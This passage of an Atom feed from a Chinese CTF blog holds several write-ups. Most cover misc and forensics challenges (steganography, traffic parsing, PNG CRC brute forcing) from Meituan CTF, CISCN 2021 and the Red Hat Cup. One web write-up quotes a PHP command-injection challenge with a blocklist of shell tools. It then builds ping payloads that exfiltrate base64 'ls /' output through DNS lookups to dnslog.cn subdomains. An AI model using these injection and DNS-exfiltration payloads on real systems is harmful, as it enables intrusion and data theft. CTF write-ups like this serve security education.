    <content type="html"><![CDATA[<h3><span id="美团ctf初决">美团CTF初+决</span></h3><p>团队第九</p><hr><h4><span id="different_puzzle">Different_Puzzle</span></h4><p>得到null.vhd</p><p>用360压缩打开</p><p>直接拖出来</p><p>得到69张图片，1个flag.exe</p><p>后缀名vhd，用取证大师打开</p><p>根据</p><p><img lazyload src="/images/loading.svg" data-src="1.png" alt="1"></p><p><a class="link" href="https://github.com/jschicht/UsnJrnl2Csv">https://github.com/jschicht/UsnJrnl2Csv<i class="fas fa-external-link-alt"></i></a></p><p>找到日志，</p><p><img lazyload src="/images/loading.svg" data-src="2.png" alt="2"></p><p>得到对应的png</p><p>通过PS拼接得到</p><p><img lazyload src="/images/loading.svg" data-src="3.png" alt="3"></p><p>扫描条形码得到【EuO9&amp;cDH】</p><p><img lazyload src="/images/loading.svg" data-src="4.png" alt="4"></p><p>注：此处有个大坑，若用一向以精确度闻名的支付宝扫码的话，会出现只能识别一半的情况，反倒是QQ能得到准确的内容【EuO9&amp;cDH】</p><p>运行flag.exe得到flag</p><p><img lazyload src="/images/loading.svg" data-src="5.png" alt="5"></p><p><strong>flag{af26d693-2de2-4b16-be49-d95e83a43f76}</strong></p><h4><span id="misc_cp">MISC_CP</span></h4><p>预览图看到蓝色部分的二维码</p><p>foremost后</p><p><img lazyload src="/images/loading.svg" data-src="6.png" alt="6"></p><p>扫描得到</p><p><img lazyload src="/images/loading.svg" data-src="7.png" alt="7"></p><p>11-8437-f2c73bf76c16}</p><p>另一半flag为lsb隐写</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">java -jar Stegsolove.jar</span><br></pre></td></tr></table></figure><p>在Blue plane 6时得到汉信码</p><p><img lazyload src="/images/loading.svg" data-src="8.png" alt="8"></p><p>中国编码APP</p><p><img lazyload src="/images/loading.svg" data-src="9.jpg" alt="9"></p><p>flag{d4dce746-7f13-47</p><p><strong>flag值：flag{d4dce746-7f13-4711-8437-f2c73bf76c16}</strong></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h3&gt;&lt;span id=&quot;美团ctf初决&quot;&gt;美团CTF初+决&lt;/span&gt;&lt;/h3&gt;
&lt;p&gt;团队第九&lt;/p&gt;
&lt;hr&gt;
&lt;h4&gt;&lt;span id=&quot;different_puzzle&quot;&gt;Different_Puzzle&lt;/span&gt;&lt;/h4&gt;
&lt;p&gt;得到null.vhd&lt;/p&gt;
</summary>
      
    
    
    
    
    <category term="challenge" scheme="http://mklkx.github.io/tags/challenge/"/>
    
  </entry>
  
  <entry>
    <title>DNSlog盲注</title>
    <link href="http://mklkx.github.io/2021/05/22/DNSlog%E7%9B%B2%E6%B3%A8/"/>
    <id>http://mklkx.github.io/2021/05/22/DNSlog%E7%9B%B2%E6%B3%A8/</id>
    <published>2021-05-22T08:17:46.000Z</published>
    <updated>2021-05-22T13:09:11.835Z</updated>
    
    <content type="html"><![CDATA[<h1><span id="dnslog盲注"><em>DNSlog盲注</em></span></h1><h2><span id="题目源码如下">题目源码如下：</span></h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">if(isset($_GET[&quot;Ginkgo&quot;]))&#123;</span><br><span class="line">    $c &#x3D; $_GET[&quot;Ginkgo&quot;];</span><br><span class="line">    if(!preg_match(&quot;&#x2F;flag|wget|sleep|socket|sock|perl|ruby|curl|php&#x2F;i&quot;, $c))&#123;</span><br><span class="line">        shell_exec(&quot;ping -c 3 &quot;.$c);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><h2><span id="分析">分析：</span></h2><p>传入变量Ginkgo</p><p>赋值给变量c</p><p>判断变量c是否等于&quot;/flag|wget|sleep|socket|sock|perl|ruby|curl|php/i&quot;</p><p>若不一致则执行</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ping -c 3 $c</span><br></pre></td></tr></table></figure><p>简单学习了一下http://blog.merl1ng.cc/2018/03/02/dnslog%E5%88%A9%E7%94%A8/</p><p>在pdsdt师傅的指导下</p><p>简单捋了下最终需构造的命令如下</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ping -c 3 &#96;ls &#x2F;|base64|head -n 1|cut -c 0-80&#96;.DNSLog.cn</span><br></pre></td></tr></table></figure><h3><span id="1">1）</span></h3><p>为解决无法回显的问题，需要一个介质来接收返回的信息，</p><p>DNSLog.cn中Get SubDomain,</p><p>得到一个dnslog的子域名</p><p>在自身服务器中执行命令后</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ping -c 3 6t775q.dnslog.cn</span><br></pre></td></tr></table></figure><p>能在DNSLog的Refresh Record中看到自身的ip</p><p>这意味着咱们已经能够利用这种方式得到回显</p><h3><span id="2">2）</span></h3><p>进一步构造</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ping -c 3 &#96;ls &#x2F;&#96;.bet8m1.dnslog.cn</span><br></pre></td></tr></table></figure><p>空格问题需要绕过</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ping -c 3 &#96;ls &#x2F;|base64&#96;.bet8m1.dnslog.cn</span><br></pre></td></tr></table></figure><p>但直接dump出来出现乱码</p><p>问题在于按行显示的格式问题</p><h3><span id="3">3）</span></h3><p><a class="link" href="https://www.runoob.com/linux/linux-comm-head.html?ivk_sa=1024320u">https://www.runoob.com/linux/linux-comm-head.html?ivk_sa=1024320u<i class="fas fa-external-link-alt"></i></a></p><p><a class="link" href="https://www.runoob.com/linux/linux-comm-cut.html">https://www.runoob.com/linux/linux-comm-cut.html<i class="fas fa-external-link-alt"></i></a></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ping -c 3 &#96;ls &#x2F;|base64|head -n 1|cut -c 40-80&#96;.bet8m1.dnslog.cn</span><br></pre></td></tr></table></figure><p>截取第一行第40到80个字符，</p><p>注意字符的重复和替代情况</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1&gt;&lt;span id=&quot;dnslog盲注&quot;&gt;&lt;em&gt;DNSlog盲注&lt;/em&gt;&lt;/span&gt;&lt;/h1&gt;
&lt;h2&gt;&lt;span id=&quot;题目源码如下&quot;&gt;题目源码如下：&lt;/span&gt;&lt;/h2&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;</summary>
      
    
    
    
    
    <category term="WEB" scheme="http://mklkx.github.io/tags/WEB/"/>
    
  </entry>
  
  <entry>
    <title>2021CISCN</title>
    <link href="http://mklkx.github.io/2021/05/18/2021CISCN/"/>
    <id>http://mklkx.github.io/2021/05/18/2021CISCN/</id>
    <published>2021-05-18T02:06:21.000Z</published>
    <updated>2021-05-18T02:28:06.588Z</updated>
    
    <content type="html"><![CDATA[<h1><span id="2021ciscn-misc">2021CISCN-Misc</span></h1><hr><h2><span id="tiny-traffic">tiny traffic</span></h2><p>流量包导出http对象得到一堆文件</p><p>其中【test】和【secret】似乎有点东西</p><p>但直接打开为乱码</p><p>考虑br解码</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import brotli</span><br><span class="line">f &#x3D; open(&#39;secret&#39;,&#39;rb&#39;).read()</span><br><span class="line">print(f)</span><br><span class="line">c &#x3D; brotli.decompress(f)</span><br><span class="line">print(c)</span><br><span class="line">#b&#39;\x08\xc8\x01\x10\xa2\xd4\x99\x07\x1a\x0e\n\x05e2345\x12\x057af2c\x1a\x0f\n\x067889b0\x12\x0582bc0 \xc6\xa2\xec\x07*\td172a38dc&#39;</span><br></pre></td></tr></table></figure><p>以上是解码后的【secret】内容，猜测为flag</p><p>【test】</p><p><img lazyload src="/images/loading.svg" data-src="ciscn1.png" alt="1"></p><p>根据内容搜索得到https://blog.csdn.net/u013210620/article/details/81317731</p><p>安装好后，将test后缀改为.proto</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">protoc test.proto  --python_out&#x3D;.&#x2F;</span><br></pre></td></tr></table></figure><p>解决报错https://blog.csdn.net/qq_27563511/article/details/80696403</p><p><img lazyload src="/images/loading.svg" data-src="ciscn2.png" alt="2"></p><p>得到test_pb2.py</p><p>编写代码，</p><p>调用这个库</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#! &#x2F;usr&#x2F;bin&#x2F;env python</span><br><span class="line">import test_pb2</span><br><span class="line"></span><br><span class="line">flag_pb &#x3D; test_pb2.PBResponse()</span><br><span class="line">flag_pb.ParseFromString(b&#39;\x08\xc8\x01\x10\xa2\xd4\x99\x07\x1a\x0e\n\x05e2345\x12\x057af2c\x1a\x0f\n\x067889b0\x12\x0582bc0 \xc6\xa2\xec\x07*\td172a38dc&#39;)</span><br><span class="line">print(flag_pb)</span><br></pre></td></tr></table></figure><p><img lazyload src="/images/loading.svg" data-src="ciscn3.png" alt="3"></p><p>按要求拼接得到</p><p><strong>CISCN{e66a22e23457889b0fb1146d172a38dc}</strong></p><h2><span id="running_pixel">running_pixel</span></h2><p>gif动图分离得到382张png</p><p>观察得它们中存在统一RGB值为(233,233,233)的色块</p><p>提取出他们的坐标值</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#!&#x2F;usr&#x2F;bin&#x2F;python</span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line">import cv2</span><br><span class="line">import numpy as np</span><br><span class="line">from PIL import Image</span><br><span class="line">for k in range(0,382):#张数</span><br><span class="line">    im &#x3D; Image.open(&#39;Frame%d.png&#39;%k)</span><br><span class="line">    # print(im.size[0])</span><br><span class="line">    # print(im.size[1])</span><br><span class="line">    for i in range(0,400):</span><br><span class="line">        for j in range(0,400):</span><br><span class="line">            #print(&#39;Frame%d.png&#39;%k)</span><br><span class="line">            # print(im.getpixel((i, j)))</span><br><span class="line">            if(im.getpixel((i, j))&#x3D;&#x3D;(233, 233, 233, 255)):</span><br><span class="line">                # print(&#39;Frame%d.png&#39;%k)</span><br><span class="line">                print(i,j)</span><br><span class="line">                #print(im.getpixel((i,j)))</span><br><span class="line">                break</span><br></pre></td></tr></table></figure><p>保存到xy.txt中</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">from PIL import Image</span><br><span class="line">img&#x3D;Image.new(&#39;RGB&#39;,(400,400))</span><br><span class="line">file &#x3D; open(&quot;xy.txt&quot;, &quot;r&quot;)</span><br><span class="line">text &#x3D; file.readlines()[0]</span><br><span class="line">ch &#x3D; text.split(&quot; &quot;)</span><br><span class="line">print(ch)</span><br><span class="line">x &#x3D; []</span><br><span class="line">y &#x3D; []</span><br><span class="line">for i in ch:</span><br><span class="line">   x.append(i.split(&#39;,&#39;)[0])</span><br><span class="line">   y.append(i.split(&#39;,&#39;)[1])</span><br><span class="line">#print(x)</span><br><span class="line">print(len(x))</span><br><span class="line">for k in range(len(x)):</span><br><span class="line">   print(k)</span><br><span class="line">   img.putpixel((int(y[k]),int(x[k])),(233,233,233))</span><br><span class="line">   img.save(&quot;test%d.png&quot;%k)</span><br></pre></td></tr></table></figure><p>读取坐标值数据并写在对应位置上</p><p><img lazyload src="/images/loading.svg" data-src="ciscn4.png" alt="4"></p><p>flag的顺序为数字依次出现的数据</p><p><strong>CISCN{12504d0f-9de1-4b00-87a5-a5fdd0986a00}</strong></p><h2><span id="隔空传话">隔空传话</span></h2><p>pdu编码</p><p>首先进行数据清洗</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import re</span><br><span class="line">b &#x3D; []</span><br><span class="line">d &#x3D; []</span><br><span class="line">e &#x3D; []</span><br><span class="line">a &#x3D; open(&#39;data.txt&#39;)</span><br><span class="line">for i in a:</span><br><span class="line">    b.append(i[34:46])</span><br><span class="line"># print(b)</span><br><span class="line"></span><br><span class="line">for i in b:</span><br><span class="line">    # print(i)</span><br><span class="line">    # c &#x3D; i[::2]</span><br><span class="line">    # print(c)</span><br><span class="line">    c&#x3D;&quot;&quot;</span><br><span class="line">    text_list &#x3D; re.findall(&quot;.&#123;2&#125;&quot;, i)</span><br><span class="line">    for j in text_list:</span><br><span class="line">        c+&#x3D;j[::-1]</span><br><span class="line">    d.append(c)</span><br><span class="line">d &#x3D; sorted(d)</span><br><span class="line"># print(d)</span><br><span class="line">#  此时d为已经排序好的顺序</span><br><span class="line">for i in d:</span><br><span class="line">    text_list &#x3D; re.findall(&quot;.&#123;2&#125;&quot;, i)</span><br><span class="line">    c&#x3D;&quot;&quot;</span><br><span class="line">    for j in text_list:</span><br><span class="line">        c+&#x3D;j[::-1]</span><br><span class="line">    e.append(c)</span><br><span class="line"># print(e)</span><br><span class="line">file_handle&#x3D;open(&#39;dnm.txt&#39;,mode&#x3D;&#39;w&#39;)</span><br><span class="line">for i in range(616):</span><br><span class="line">    woc &#x3D; 0</span><br><span class="line">    c &#x3D; (&quot;调转前:&#123;&#125; |调转后: &#123;&#125; \n&quot;.format(d[woc],e[woc]))</span><br><span class="line">    file_handle.write(c)</span><br><span class="line">    woc+&#x3D;1</span><br><span class="line"># e &#x3D; sorted(e)</span><br><span class="line">#</span><br><span class="line"># for i in d:</span><br><span class="line">#     file_handle.write(&quot;&#123;&#125;\n &quot;.format(i))</span><br><span class="line">#     print(i)</span><br><span class="line"># file2 &#x3D; open(&#39;dnm.txt&#39;)</span><br><span class="line">#</span><br><span class="line"># step &#x3D; 0 #计数器</span><br><span class="line"># for i in file2:</span><br><span class="line">#     print(&quot;调转后:&#123;&#125;  调转前:&#123;&#125;&quot;.format(i,e[step]))</span><br><span class="line">#     step +&#x3D; 1</span><br></pre></td></tr></table></figure><p><img lazyload src="/images/loading.svg" data-src="ciscn5.png" alt="5"></p><p>得到类似210425194359的，按照年月日时分秒排列的数据</p><p>经过手动匹配后，pdu解码</p><p><a class="link" href="http://www.sendsms.cn/pdu/">http://www.sendsms.cn/pdu/<i class="fas fa-external-link-alt"></i></a></p><p>补充前后关键数据如下：</p><p><img lazyload src="/images/loading.svg" data-src="ciscn6.png" alt="6"></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">the first part of the flag is the first 8 digits of your phone number </span><br><span class="line">那其他部分呢 </span><br><span class="line">看看你能从这些数据里发现什么？w465</span><br></pre></td></tr></table></figure><p>拼合数据得到png</p><p><img lazyload src="/images/loading.svg" data-src="ciscn7.png" alt="7"></p><p>贴进010后</p><p>png根据crc32爆破长宽</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># -*- coding: utf8 -*-</span><br><span class="line">import os</span><br><span class="line">import binascii</span><br><span class="line">import struct</span><br><span class="line">misc &#x3D; open(&quot;Untitled1.png&quot;, &quot;rb&quot;).read()</span><br><span class="line"># 爆破宽</span><br><span class="line">for i in range(1024):</span><br><span class="line">    data &#x3D; misc[12:16] + struct.pack(&#39;&gt;i&#39;, i) + misc[20:29]  # IHDR数据</span><br><span class="line">    crc32 &#x3D; binascii.crc32(data) &amp; 0xffffffff</span><br><span class="line">    if crc32 &#x3D;&#x3D; 0xBFFAF2DD:  # IHDR块的crc32值</span><br><span class="line">        print(&#39;weight&#39;)</span><br><span class="line">        print(i)</span><br><span class="line">        print(&quot;hex:&quot; + hex(i))</span><br><span class="line"># 爆破高</span><br><span class="line">for i in range(1024):</span><br><span class="line">    data &#x3D; misc[12:20] + struct.pack(&#39;&gt;i&#39;, i) + misc[24:29]</span><br><span class="line">    crc32 &#x3D; binascii.crc32(data) &amp; 0xffffffff</span><br><span class="line">    if crc32 &#x3D;&#x3D; 0xBFFAF2DD:</span><br><span class="line">        print(&#39;height&#39;)</span><br><span class="line">        print(i)</span><br><span class="line">        print(&quot;hex:&quot; + hex(i))</span><br><span class="line"># weight</span><br><span class="line"># 465</span><br><span class="line"># hex:0x1d1</span><br></pre></td></tr></table></figure><p><img lazyload src="/images/loading.svg" data-src="ciscn8.png" alt="8"></p><p><strong>CISCN{15030442_b586_4c9e_b436_26def12293e4}</strong></p><h2><span id="robot">robot</span></h2><p>给了一个pcapng流</p><p>通过追踪tcp流</p><p>发现【Value.[36,35,0]】字样</p><p>疑似坐标</p><p>通过数据清洗</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import re</span><br><span class="line">with open(&#39;.&#x2F;tcp.txt&#39;,&#39;r&#39;,encoding&#x3D;&quot;utf-8&quot;) as f:</span><br><span class="line">    text &#x3D; f.read()</span><br><span class="line">    p1 &#x3D; re.compile(r&#39;Value\.\[\d+,\d+,-?\d+\.*\d*\]&#39;)</span><br><span class="line">    data &#x3D; (re.findall(p1, text))</span><br><span class="line"></span><br><span class="line">    with open(&#39;data.txt&#39;,&#39;w&#39;,encoding&#x3D;&quot;utf-8&quot;) as l:</span><br><span class="line">        l.write(str(data))</span><br></pre></td></tr></table></figure><p>得到</p><p><img lazyload src="/images/loading.svg" data-src="ciscn9.png" alt="9"></p><p>经过处理，参考前卷代码</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">from PIL import Image</span><br><span class="line">img&#x3D;Image.new(&#39;RGB&#39;,(400,400))</span><br><span class="line">mark&#x3D;[(27,36),(28,35),(29,35),(31,35),(32,35),(33,35),(35,35),(36,35),(37,35),(39,34),(40,34),(41,33),(42,32),(43,32),(45,32),(47,31),(48,29),(49,28),(49,27),(50,26),(50,25),(51,23),(51,22),(51,21),(52,20),(52,19),(52,18),(52,17),(52,16),(52,15),(51,14),(50,14),(49,14),(48,14),(47,14),(46,14),(45,14),(44,14),(43,14),(42,14),(40,14),(39,14),(37,14),(35,14),(34,14),(32,14),(30,14),(28,14),(27,14),(26,14),(25,14),(24,14),(23,14),(22,14),(21,15),(20,16),(19,17),(18,19),(18,21),(18,22),(18,23),(18,24),(18,26),(18,27),(18,28),(18,30),(18,32),(18,33),(18,34),(19,37),(21,39),(21,40),(22,42),(24,44),(24,45),(26,47),(27,48),(28,49),(29,50),(30,51),(31,52),(33,53),(34,53),(35,54),(36,54),(37,54),(38,54),(39,54),(40,54),(41,54),(44,54),(46,54),(48,54),(50,54),(52,53),(53,53),(54,52),(55,52),(56,52),(58,51),(59,50),(61,49),(62,49),(64,47),(65,47),(67,46),(68,46),(70,45),(71,44),(71,44,-10),(125,23),(125,23),(124,22),(123,22),(121,21),(118,20),(115,19),(113,19),(112,18),(111,18),(109,17),(106,16),(104,16),(103,16),(102,15),(101,15),(100,15),(99,15),(98,15),(97,15),(96,15),(95,15),(94,15),(93,15),(92,15),(91,15),(89,15),(87,17),(85,18),(85,19),(84,21),(83,21),(82,22),(82,23),(81,24),(81,26),(80,28),(80,29),(80,31),(80,32),(79,34),(79,35),(79,37),(79,39),(79,41),(79,43),(79,44),(79,46),(79,47),(80,48),(81,49),(82,50),(84,50),(87,51),(88,51),(90,51),(91,51),(93,51),(94,51),(97,51),(100,50),(101,49),(102,49),(103,48),(105,46),(106,45),(108,43),(109,42),(110,41),(111,39),(112,38),(112,36),(113,34),(114,33),(115,32),(115,31),(116,30),(117,28),(118,27),(118,28),(117,30),(116,32),(115,34),(115,36),(114,39),(114,41),(114,43),(114,45),(114,47),(114,48),(114,50),(114,52),(114,53),(115,54),(116,55),(117,56),(118,57),(120,57),(122,57),(124,57),(126,57),(128,57),(131,57),(133,57),(136,57),(138,57),(141,57),(143,56),(145,55),(147,53),(149,52),(150,52),(152,50),(153,49),(155,47),(156,46),(157,45),(157,45,-10),(212,24),(212,24),(213,23),(211,21),(210,20),(209,19),(208,18),(207,17),(206,16),(205,15),(204,15),(201,14),(200,14),(199,14),(197,14),(196,14),(195,14),(193,14),(191,14),(189,16),(188,16),(187,16),(186,17),(185,17),(183,18),(183,20),(183,21),(182,22),(182,23),(182,24),(182,25),(182,26),(182,27),(182,29),(183,31),(184,32),(186,33),(187,34),(188,34),(189,35),(190,35),(192,36),(194,37),(196,37),(198,38),(199,38),(200,38),(201,38),(202,39),(203,39),(204,40),(207,41),(207,42),(208,43),(208,44),(208,45),(208,46),(208,48),(208,50),(208,51),(207,53),(207,54),(206,56),(204,58),(203,60),(202,61),(201,62),(201,63),(200,64),(199,64),(198,64),(197,65),(196,65),(195,65),(193,65),(192,65),(190,65),(189,65),(187,65),(185,65),(184,65),(183,65),(181,64),(180,63),(179,63),(178,62),(177,62),(175,61),(174,60),(173,59),(173,59,-10),(243,20),(243,20),(244,19),(244,21),(244,25),(245,26),(245,29),(247,32),(247,34),(248,36),(248,37),(249,39),(250,40),(251,42),(251,43),(252,44),(254,44),(256,44),(258,44),(260,42),(262,41),(263,40),(265,38),(266,35),(267,32),(268,30),(271,27),(272,25),(273,22),(274,21),(275,20),(275,19),(274,18),(274,20),(272,22),(271,23),(271,26),(268,29),(266,33),(266,35),(265,37),(263,40),(262,42),(262,44),(261,47),(260,49),(259,51),(258,55),(258,56),(257,58),(255,61),(254,62),(253,63),(253,64),(252,65),(251,66),(250,67),(249,68),(248,69),(247,70),(246,71),(245,72),(244,73),(244,73,-10),(298,64),(298,64),(299,65),(300,65),(302,65),(304,65),(306,65),(308,65),(309,65),(312,65),(315,65),(317,65),(319,65),(322,65),(325,65),(327,65),(330,65),(332,65),(334,66),(335,66),(335,66,-10),(20,103),(20,104),(20,107),(20,110),(20,112),(20,114),(20,118),(19,121),(18,124),(17,126),(17,130),(17,134),(17,137),(17,139),(17,142),(17,143),(17,146),(17,147),(17,149),(17,150),(17,149),(17,148),(17,146),(18,145),(18,143),(19,142),(20,141),(20,140),(21,138),(21,137),(22,135),(23,134),(24,132),(25,131),(26,129),(27,128),(28,127),(29,126),(31,125),(32,124),(32,123),(34,121),(35,120),(37,120),(38,119),(40,118),(41,118),(43,117),(44,116),(46,115),(48,115),(49,114),(50,113),(51,113),(52,112),(52,112,-10),(80,121),(80,121),(79,120),(78,121),(77,122),(77,123),(77,124),(76,127),(75,128),(74,129),(73,131),(73,132),(73,133),(72,135),(72,136),(72,137),(72,138),(72,139),(72,140),(72,142),(72,144),(72,145),(73,148),(74,149),(77,150),(78,150),(80,151),(81,151),(82,151),(83,151),(84,151),(85,151),(87,151),(89,151),(90,151),(92,150),(93,150),(95,149),(97,147),(98,146),(99,146),(100,145),(101,144),(102,142),(102,141),(104,139),(104,138),(105,136),(105,135),(105,133),(105,132),(105,131),(105,129),(104,128),(103,126),(102,126),(101,125),(98,123),(96,123),(95,123),(93,123),(92,122),(90,121),(89,121),(86,120),(86,120,-10),(147,98),(147,98),(146,99),(145,100),(144,103),(143,104),(142,105),(142,106),(142,109),(142,111),(142,114),(141,118),(140,120),(139,123),(138,127),(138,129),(137,133),(135,135),(134,137),(133,139),(131,142),(131,143),(131,145),(130,146),(129,149),(128,152),(128,153),(127,156),(127,157),(126,158),(127,157),(129,157),(130,156),(132,156),(134,155),(137,153),(138,152),(139,151),(140,150),(143,149),(144,148),(145,147),(146,146),(147,145),(149,144),(149,143),(150,142),(151,141),(152,140),(152,139),(153,138),(153,137),(153,136),(153,135),(153,134),(153,133),(152,132),(151,131),(150,131),(149,130),(147,129),(147,129,-10),(186,136),(186,136),(183,137),(182,138),(182,139),(182,140),(181,142),(179,144),(179,145),(179,147),(178,149),(177,150),(177,151),(177,152),(177,154),(177,156),(177,157),(177,158),(178,160),(179,161),(180,162),(181,163),(182,164),(184,164),(186,164),(187,164),(188,164),(190,163),(191,162),(192,162),(194,160),(196,159),(197,158),(197,156),(198,155),(200,153),(200,152),(201,150),(201,149),(201,148),(201,147),(201,145),(201,144),(201,142),(201,141),(201,139),(201,138),(200,136),(199,135),(198,135),(197,135),(196,135),(195,135),(193,135),(192,135),(190,135),(189,135),(189,135,-10),(223,167),(223,167),(224,167),(226,167),(228,167),(229,167),(232,167),(233,167),(234,167),(235,167),(237,167),(238,167),(240,167),(241,167),(243,167),(244,167),(246,167),(247,167),(250,168),(251,168),(252,168),(253,168),(254,168),(254,168,-10),(269,135),(271,136),(273,138),(275,140),(276,141),(278,143),(280,145),(282,147),(284,149),(285,150),(288,152),(289,153),(291,154),(293,156),(294,157),(296,159),(297,160),(298,161),(299,162),(299,162,-10),(300,136),(299,136),(297,137),(296,138),(294,141),(294,142),(293,144),(293,145),(292,148),(291,149),(290,151),(288,153),(288,155),(287,156),(286,157),(285,159),(284,160),(283,161),(282,162),(281,163),(280,164),(279,165),(279,165,-10),(327,142),(328,143),(330,145),(332,148),(333,149),(335,151),(337,154),(339,156),(341,158),(342,159),(345,160),(347,161),(348,162),(350,164),(351,165),(352,166),(355,168),(356,169),(356,169,-10),(351,143),(350,143),(348,144),(347,144),(346,145),(343,148),(341,150),(339,152),(336,155),(333,158),(330,159),(327,162),(325,165),(323,167),(322,168),(319,170),(317,171),(316,171),(314,172),(313,172),(313,172)]</span><br><span class="line">print(mark[0])</span><br><span class="line">for j in range(len(mark)):</span><br><span class="line">    for i in range(len(mark)):</span><br><span class="line">        img.putpixel((list(mark[i])[0], list(mark[i])[1]), (255, 255, 255))</span><br><span class="line">img.save(&#39;flag.png&#39;)</span><br></pre></td></tr></table></figure><p>得到</p><p><img lazyload src="/images/loading.svg" data-src="ciscn10.png" alt="10"></p><p>md5加密</p><p><strong>CISCN{d4f1fb80bc11ffd722861367747c0f10}</strong></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1&gt;&lt;span id=&quot;2021ciscn-misc&quot;&gt;2021CISCN-Misc&lt;/span&gt;&lt;/h1&gt;
&lt;hr&gt;
&lt;h2&gt;&lt;span id=&quot;tiny-traffic&quot;&gt;tiny traffic&lt;/span&gt;&lt;/h2&gt;
&lt;p&gt;流量包导出http对象得到一堆文件&lt;/p&gt;
</summary>
      
    
    
    
    
    <category term="challenge" scheme="http://mklkx.github.io/tags/challenge/"/>
    
    <category term="MISC" scheme="http://mklkx.github.io/tags/MISC/"/>
    
  </entry>
  
  <entry>
    <title>2021红帽杯</title>
    <link href="http://mklkx.github.io/2021/05/11/2021%E7%BA%A2%E5%B8%BD%E6%9D%AF/"/>
    <id>http://mklkx.github.io/2021/05/11/2021%E7%BA%A2%E5%B8%BD%E6%9D%AF/</id>
    <published>2021-05-11T06:31:40.000Z</published>
    <updated>2021-05-11T06:35:05.293Z</updated>
    
    <content type="html"><![CDATA[<h3><span id="2021红帽杯">2021红帽杯</span></h3><hr><h4><span id="签到">签到</span></h4><p>根据文件名提示，</p><p>把txt拖进010editor，</p><p>更改编码方式为【EBCDIC】</p><p>flag{we1c0me_t0_redhat2021}</p><h4><span id="colorful-code">colorful code</span></h4><p>附件得到两个data</p><p>一个全是数字，一个是十六进制</p><p>结合题目【colorful】</p><p>猜测为图片隐写</p><p>1）如何形成图片data2开头为【000000】</p><p><img lazyload src="/images/loading.svg" data-src="1.png" alt="1"></p><p>猜测为RGB，相当于字典</p><p>而data1为索引值，数字对应data2中的第几组数据。</p><p>接下来是长宽的问题</p><p>尝试了很多方式，</p><p>发现data1的长度为7068，微调后发现【7067=37*191】</p><p>脚本如下</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">from PIL import Image</span><br><span class="line">im &#x3D; open(&quot;data1&quot;,&quot;r&quot;)</span><br><span class="line">mark &#x3D; im.readline().split(&#39; &#39;)</span><br><span class="line">print(mark)</span><br><span class="line">print(len(mark))</span><br><span class="line">c &#x3D; [(0,0,0),(0,0,192),(0,255,255),(0,255,0),(255,192,255),(255,192,192),(192,192,255),(192,192,0),(255,0,255),(255,0,0),(192,0,0),(192,0,192),(255,255,255),(255,255,0),(255,255,192),(0,192,0),(0,192,192),(192,255,255),(192,255,192),(0,0,255)]</span><br><span class="line">pic &#x3D; Image.new(&quot;RGB&quot;,(37,191))</span><br><span class="line">k&#x3D;0</span><br><span class="line">for i in range(37):</span><br><span class="line">    for j in range(191):</span><br><span class="line">        pic.putpixel((int(i),int(j)),c[int(mark[k])])</span><br><span class="line">        k +&#x3D; 1</span><br><span class="line">pic.save(&#39;flag.png&#39;)</span><br></pre></td></tr></table></figure><p>得到png</p><p><img lazyload src="/images/loading.svg" data-src="2.png" alt="2"></p><p>找到解密网站https://www.bertnase.de/npiet/npiet-execute.php</p><p>得到flag</p><p><img lazyload src="/images/loading.svg" data-src="3.png" alt="3"></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">88842f20-fb8c-45c9-ae8f-36135b6a0f11</span><br></pre></td></tr></table></figure><p>加flag头上交</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h3&gt;&lt;span id=&quot;2021红帽杯&quot;&gt;2021红帽杯&lt;/span&gt;&lt;/h3&gt;
&lt;hr&gt;
&lt;h4&gt;&lt;span id=&quot;签到&quot;&gt;签到&lt;/span&gt;&lt;/h4&gt;
&lt;p&gt;根据文件名提示，&lt;/p&gt;
&lt;p&gt;把txt拖进010editor，&lt;/p&gt;
&lt;p&gt;更改编码方式为【EBCDIC】&lt;</summary>
      
    
    
    
    
    <category term="challenge" scheme="http://mklkx.github.io/tags/challenge/"/>
    
    <category term="MISC" scheme="http://mklkx.github.io/tags/MISC/"/>
    
  </entry>
  
  <entry>
    <title>2021津门杯</title>
    <link href="http://mklkx.github.io/2021/05/11/2021%E6%B4%A5%E9%97%A8%E6%9D%AF/"/>
    <id>http://mklkx.github.io/2021/05/11/2021%E6%B4%A5%E9%97%A8%E6%9D%AF/</id>
    <published>2021-05-11T06:27:53.000Z</published>
    <updated>2021-06-06T13:37:47.180Z</updated>
    
